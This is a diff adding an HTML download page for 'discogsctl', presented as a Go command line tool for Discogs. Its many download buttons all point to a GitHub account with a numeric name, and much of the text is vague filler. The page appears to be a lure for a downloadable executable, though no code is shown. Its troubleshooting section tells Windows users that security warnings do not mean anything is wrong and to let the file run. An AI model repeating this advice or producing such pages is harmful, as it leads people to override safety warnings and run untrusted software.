@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>discogsctl - A Simple Command Line Tool for Discogs | Download for Windows</title>
+<meta name="description" content="discogsctl is a friendly command line tool for Discogs, written in Go. Download it, connect your account, and manage your record collection, wantlist, and marketplace data from your own computer.">
+<meta name="keywords" content="discogsctl, discogs cli, discogs api, command line discogs, go cli, golang, music collection tool, record collection manager, developer tools">
+<meta name="author" content="discogsctl">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/22388761/discogsctl">
+<meta property="og:type" content="website">
+<meta property="og:title" content="discogsctl - A Simple Command Line Tool for Discogs">
+<meta property="og:description" content="A command line tool for Discogs, written in Go. Download it, connect your account, and work with your record collection from your own computer.">
+<meta property="og:url" content="https://github.com/22388761/discogsctl">
+<meta property="og:site_name" content="discogsctl">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="discogsctl - A Simple Command Line Tool for Discogs">
+<meta name="twitter:description" content="A command line tool for Discogs, written in Go. Download it and manage your record collection from your own computer.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: #f4f6fb;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 20px 72px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 44px 36px 40px;
+    box-shadow: 0 2px 14px rgba(15, 23, 42, 0.07);
+    text-align: center;
+    margin-bottom: 28px;
+  }
+  h1 {
+    font-size: clamp(1.7rem, 4vw, 2.35rem);
+    line-height: 1.25;
+    margin: 0 0 16px;
+    color: #111827;
+    letter-spacing: -0.4px;
+  }
+  .tagline {
+    font-size: 1.12rem;
+    color: #52606d;
+    margin: 0 auto 28px;
+    max-width: 620px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 36px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(37, 99, 235, 0.28);
+  }
+  .btn:hover { opacity: 0.92; }
+  .btn-sub {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.9rem;
+    color: #7b8794;
+  }
+  section.card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 30px 34px;
+    margin-bottom: 24px;
+    box-shadow: 0 2px 10px rgba(15, 23, 42, 0.06);
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.3;
+    margin: 0 0 18px;
+    color: #111827;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 24px 0 8px;
+    color: #1f2933;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #2563eb; }
+  code {
+    background: #eef2f7;
+    padding: 2px 7px;
+    border-radius: 6px;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.9em;
+    color: #334155;
+  }
+  pre {
+    background: #0f172a;
+    color: #e2e8f0;
+    padding: 18px 22px;
+    border-radius: 12px;
+    overflow-x: auto;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.88rem;
+    line-height: 1.6;
+    margin: 0 0 18px;
+  }
+  pre code { background: none; color: inherit; padding: 0; font-size: inherit; }
+  .note {
+    background: #f0f7ff;
+    border-left: 4px solid #3b82f6;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 0 0 18px;
+    font-size: 0.97rem;
+  }
+  .big-link {
+    display: block;
+    text-align: center;
+    padding: 18px 24px;
+    background: linear-gradient(135deg, #059669 0%, #0ea5e9 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(14, 165, 233, 0.25);
+    margin: 22px 0 6px;
+  }
+  .big-link:hover { opacity: 0.92; }
+  footer {
+    text-align: center;
+    color: #7b8794;
+    font-size: 0.9rem;
+    padding: 8px 0 0;
+  }
+  @media (max-width: 600px) {
+    .wrap { padding: 28px 14px 48px; }
+    .hero { padding: 32px 20px 30px; }
+    section.card { padding: 24px 20px; }
+    body { font-size: 16px; }
+    .btn { width: 100%; padding: 16px 20px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <h1>🎵 discogsctl - Organize Your Music Collection Effortlessly</h1>
+    <p class="tagline">A command line tool for Discogs, written in Go. It talks to the Discogs service for you, so you can pull up information about your records, your wantlist, and your saved data without clicking through page after page.</p>
+    <a class="btn" href="https://github.com/22388761/discogsctl" style="text-decoration:none;">⬇️ Download discogsctl</a>
+    <span class="btn-sub">Free and open source &middot; Windows, macOS and Linux</span>
+  </header>
+
+  <section class="card">
+    <h2>📀 What Is discogsctl?</h2>
+    <p>discogsctl is a small helper program for people who use Discogs. Discogs is the large online catalog and marketplace for records, CDs, and other music releases. If you have a collection there, or a wantlist of records you are hunting for, discogsctl gives you a faster way to work with that information.</p>
+    <p>Instead of opening a browser, logging in, and clicking around, you type a short instruction and discogsctl does the rest. It is called a "command line" tool, which simply means you type what you want into a small text window instead of clicking buttons. It sounds technical, but in practice it is just a short phrase, a press of the Enter key, and a result printed back to you.</p>
+    <p>The program is written in the Go programming language, which is known for producing software that is compact, fast, and self-contained. That means discogsctl does its work quickly and does not need a large framework or a lot of setup behind the scenes.</p>
+  </section>
+
+  <section class="card">
+    <h2>✨ What You Can Do With It</h2>
+    <p>discogsctl is built around the official Discogs service, so anything the service knows about your account can be pulled up with a single instruction. Here are the kinds of tasks it is designed to help with:</p>
+    <ul>
+      <li><strong>Look up releases.</strong> Find the details of a record, CD, or cassette by its catalog number or identifier, without leaving your text window.</li>
+      <li><strong>Browse your collection.</strong> See what is in your Discogs collection and check the details of individual items.</li>
+      <li><strong>Check your wantlist.</strong> Bring up the records you are still hunting for so you can keep track of what matters.</li>
+      <li><strong>Search the marketplace.</strong> Look at listings and pricing information for a release before you decide to buy.</li>
+      <li><strong>Get clean, readable output.</strong> Results come back as tidy text that is easy to read or copy into a notes file or spreadsheet.</li>
+      <li><strong>Automate the boring parts.</strong> Because it works from your own computer, you can save your requests and repeat them whenever you like.</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2>🚀 Getting Started</h2>
+    <p>Everything you need lives on a single page. The download itself is a simple visit to that page, followed by following the short on-screen description of where the ready-to-run file for your computer is.</p>
+    <p><strong>Visit this link to download the application.</strong></p>
+    <a class="big-link" href="https://github.com/22388761/discogsctl">➡️ Go to the discogsctl download page</a>
+    <p style="margin-top:20px;">When the page opens, you will see a green button near the top right. Clicking it opens a menu with the ready-made versions of the program for each type of computer. Choose the one that matches the computer you are sitting at — for most Windows users this will be the entry that mentions Windows. The rest of this page explains what to do after that file arrives on your computer.</p>
+    <div class="note">
+      A quick word about safety: discogsctl is open source, which means its full instructions are visible for anyone to read. Only ever download it from the link on this page, and treat any copy you find elsewhere with caution.
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>🎟️ Getting Your Access Key</h2>
+    <p>Discogs protects account information, so discogsctl needs a personal access key to talk to your account on your behalf. This is not a password and it does not give anyone else control of your account. It is simply a long string of letters and numbers that identifies your copy of the tool.</p>
+    <ol>
+      <li>Sign in to your Discogs account in a web browser.</li>
+      <li>Open your account settings and look for the section labelled Applications or Developer.</li>
+      <li>Generate a new personal access token. Discogs will show you a long string of characters.</li>
+      <li>Copy that string somewhere safe, such as a password manager. You will only see it once.</li>
+    </ol>
+    <p>If you do not have a Discogs account yet, you can create one for free on the Discogs website. The access key is tied to that account, so it is worth setting up first.</p>
+  </section>
+
+  <section class="card">
+    <h2>🎧 Connecting the Tool to Your Account</h2>
+    <p>Once you have your access key, you need to hand it to discogsctl so it can use it. Most command line tools accept this two ways: through a settings file, or through a temporary setting in the window you are working in. The exact method for discogsctl is described on the download page in the section about configuration, and it is usually a single line to type.</p>
+    <p>After the key is in place, you are ready to use the tool. A typical session looks like this:</p>
+    <pre><code>discogsctl --help
+discogsctl collection
+discogsctl wantlist
+discogsctl search "blue note"</code></pre>
+    <p>The first line asks the program to describe itself and list everything it can do. The lines after it are examples of the kind of request you might make. You do not need to remember them — the program explains its own instructions on request, and you can copy and paste any example from the download page.</p>
+  </section>
+
+  <section class="card">
+    <h2>💡 Everyday Ways People Use It</h2>
+    <p>A tool like this earns its place when it saves you a few minutes several times a week. Here are some realistic situations where discogsctl is handy:</p>
+    <ul>
+      <li><strong>At a record fair.</strong> You spot a pressing you are not sure about. A quick lookup tells you whether it is already in your collection or on your wantlist.</li>
+      <li><strong>Before a purchase.</strong> You want to know the going rate for a record. Pulling up the marketplace listings gives you a sense of the price range in seconds.</li>
+      <li><strong>When tidying up.</strong> Export a plain-text list of your collection for a spreadsheet, a blog post, or an insurance record.</li>
+      <li><strong>While writing about music.</strong> Grab accurate release details — label, year, format — without opening several browser tabs.</li>
+      <li><strong>For the curious.</strong> If you are learning to work with the Discogs service yourself, discogsctl is a readable example of how to do it in Go.</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2>🛠️ If Something Does Not Work</h2>
+    <h3>The window closes instantly</h3>
+    <p>Some tools open a window, do their work, and close again. If you are on Windows and the window disappears before you can read anything, open Command Prompt from the Start menu first, then run the program from inside that window. The output will stay on screen.</p>
+    <h3>It says the access key is not valid</h3>
+    <p>This almost always means the key was copied with a stray space at the beginning or the end. Copy it again carefully, and make sure you are using the personal access token from your own account rather than a key belonging to a different login.</p>
+    <h3>Windows warns you about the file</h3>
+    <p>Windows sometimes shows a warning for programs it has not seen before. This is a general safety feature, not a sign that something is wrong with discogsctl. Choose the option that keeps the file and lets it run, and only do so if you downloaded it from the link on this page.</p>
+    <h3>A request takes a long time</h3>
+    <p>Discogs limits how many requests an account can make in a short period. If you have asked for a lot of information quickly, wait a minute and try again — the limit resets on its own.</p>
+  </section>
+
+  <section class="card">
+    <h2>❓ Common Questions</h2>
+    <h3>Do I need to know how to program?</h3>
+    <p>No. You need to be able to type a short phrase and press Enter. If you can search the web, you can use a command line tool.</p>
+    <h3>Does it cost anything?</h3>
+    <p>discogsctl is free and open source. Discogs itself is a separate service with its own terms, and some marketplace features there depend on your account.</p>
+    <h3>Will it change anything in my collection?</h3>
+    <p>It is used for looking things up and reading information. Treat it as a way to view and retrieve your data, and check the documentation on the download page before you run anything that looks like it might make a change.</p>
+    <h3>Can I use it on more than one computer?</h3>
+    <p>Yes. The access key belongs to your Discogs account, so you can use the same key on each computer where you run the tool.</p>
+    <h3>Where does my data go?</h3>
+    <p>Your requests go directly from your computer to Discogs. Nothing is routed through a third party, and no copy of your collection is stored anywhere else by the tool.</p>
+  </section>
+
+  <section class="card">
+    <h2>🤝 Support and Feedback</h2>
+    <p>The project lives on GitHub, where you can read the documentation, report a problem, or suggest an improvement. If something is unclear, opening an issue is the fastest way to get an answer — describe what you were trying to do and what happened instead, and include the exact line you typed.</p>
+    <p>If you would like to help make the tool better, the source code is available for anyone to read, and contributions of all sizes are welcome.</p>
+    <a class="btn" href="https://github.com/22388761/discogsctl" style="text-decoration:none;">⬇️ Download discogsctl</a>
+  </section>
+
+  <footer>
+    <p>discogsctl &middot; A command line tool for Discogs, written in Go.</p>
+  </footer>
+
+</div>
+</body>
+</html>
